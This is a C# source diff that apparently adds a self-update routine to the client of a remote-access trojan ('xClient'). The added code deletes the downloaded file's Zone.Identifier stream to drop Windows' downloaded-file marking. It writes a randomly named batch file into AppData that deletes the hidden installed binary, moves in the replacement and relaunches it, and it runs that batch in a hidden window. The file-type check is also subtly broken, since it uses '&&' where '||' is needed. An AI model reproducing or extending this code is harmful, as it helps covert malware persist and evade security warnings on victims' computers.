@@ -17,6 +17,10 @@ namespace xClient.Core
 {
     public static class SystemCore
     {
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool DeleteFile(string name);
+
         [DllImport("user32.dll")]
         private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
 
@@ -516,6 +520,57 @@ namespace xClient.Core
             Process.Start(startInfo);
 
             Disconnect = true;
+        }
+
+        public static void Update(Client c, string newFile)
+        {
+            try
+            {
+                DeleteFile(newFile + ":Zone.Identifier");
+
+                var bytes = File.ReadAllBytes(newFile);
+                if (bytes[0] != 'M' && bytes[1] != 'Z')
+                    throw new Exception("no pe file");
+
+                string filename = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    Helper.Helper.GetRandomFilename(12, ".bat"));
+
+                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
+                    ? "@echo off" + "\n" +
+                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                      "ping -n 20 localhost > nul" + "\n" +
+                      "del /A:H " + "\"" + MyPath + "\"" + "\n" +
+                      "move " + "\"" + newFile + "\"" + " " + "\"" + MyPath + "\"" + "\n" +
+                      "start \"\" " + "\"" + MyPath + "\"" + "\n" +
+                      "del " + "\"" + filename + "\""
+                    : "@echo off" + "\n" +
+                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                      "ping -n 20 localhost > nul" + "\n" +
+                      "del " + "\"" + MyPath + "\"" + "\n" +
+                      "move " + "\"" + newFile + "\"" + " " + "\"" + MyPath + "\"" + "\n" +
+                      "start \"\" " + "\"" + MyPath + "\"" + "\n" +
+                      "del " + "\"" + filename + "\""
+                    ;
+
+                File.WriteAllText(filename, uninstallBatch);
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    UseShellExecute = true,
+                    FileName = filename
+                };
+                Process.Start(startInfo);
+
+                Disconnect = true;
+                c.Disconnect();
+            }
+            catch (Exception ex)
+            {
+                DeleteFile(newFile);
+                new Packets.ClientPackets.Status(string.Format("Update failed: {0}", ex.Message)).Execute(c);
+            }
         }
     }
 }
